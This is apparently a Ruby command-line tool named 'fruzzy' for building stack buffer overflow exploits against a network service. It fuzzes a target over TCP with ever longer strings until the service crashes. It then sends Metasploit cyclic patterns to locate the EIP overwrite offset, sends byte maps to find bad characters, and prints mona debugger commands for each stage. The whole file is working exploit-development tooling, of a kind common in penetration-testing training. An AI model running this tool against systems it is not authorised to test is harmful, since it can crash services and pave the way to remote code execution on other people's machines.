#!/usr/bin/ruby

require 'optparse'
require 'socket'
require 'io/console'


def mona_help(what)
  case what
  when "offset"
    puts "\nMONA - find EIP offset: `!mona findmsp -distance #{@pattern_length}`\n\n"
  when "config"
    puts "\nMONA - set work dir: `!mona config -set workingfolder c:\\mona`\n\n"
  when "chars"
    puts "\nMONA - find bad characters:"
    puts "`!mona bytearray -b \"#{@excluded_chars.map do |c|
      "\\x" + c.to_s(16)
    end.join}\"`"
    puts "`!mona compare -f C:\\mona\\bytearray.bin -a <EIP address>`\n\n"
  end
end

def send(data)
  socket = TCPSocket.open(ADDRESS, PORT)
  ready = IO.select([socket], nil, nil, 5)
  if ready
    socket.gets(1024)
    socket.puts(PREFIX + " " + data)
  else
    raise
  end

  ready = IO.select([socket], nil, nil, 5)
  if ready
    socket.gets(1024)
  else
    raise
  end
  socket.close()
end

def offset()
  if @pattern_length == 0
    puts "Pattern length not detected. Please fuzz first."
    return
  end

  puts "Sending cyclic pattern, #{@pattern_length} bytes long..."
  pattern = `msf-pattern_create -l #{@pattern_length}`
  begin
    send(pattern)
  rescue
    puts "Sending failed."
  end

  mona_help("offset")

  print "Enter detected EIP offset: "
  @offset = STDIN.gets.to_i
end

def fuzz()
  length = 0

  loop do
    length += 100
    puts "Sending fuzz payload, #{length} bytes long..."
    begin
      send("A"*length)
    rescue Interrupt
      puts "Fuzzing aborted."
      return
    rescue
      puts "Connect failed. Setting pattern_length to #{length + 500}."
      @pattern_length = length + 500
      return
    end
    sleep(0.1)
  end
end

def characters()
  chars = ((0..255).to_a - @excluded_chars).pack("C*")
  puts "Sending character map..."
  begin
    send("A"*@offset + "BBBB" + chars)
  rescue
  end
  puts "Done."
  mona_help("chars")
  exclude()
end

def exclude()
  print "Insert hex values to exclude, separated by space: "
  input = STDIN.gets.split
  input.each do |i|
    i =~ /[0-9a-f]{1,2}/i or next
    @excluded_chars << i.to_i(16)
  end
end

if ARGV.length < 2
  puts "Usage: #{$0} <command>"
  exit
end

ADDRESS = ARGV[0]
PORT = ARGV[1].to_i
PREFIX = ARGV[2]

@excluded_chars = [0x00]
@pattern_length = 0
@offset = 0

mona_help("config")

loop do
  puts "Pattern length: #{@pattern_length} bytes"
  puts "EIP offset: #{@offset} bytes"
  puts "Excluded bytes: #{@excluded_chars.map do |x| x.to_s(16) end}"
  print "fruzzy [(f)uzz | (o)ffset | find bad (b)ytes | (e)xclude bytes | (q)uit]> "
  input = STDIN.getch
  puts input

  case input
  when 'f'
    fuzz()
  when 'o'
    offset()
  when 'b'
    characters()
  when 'e'
    exclude()
  when 'q'
    exit
  end
  puts
end

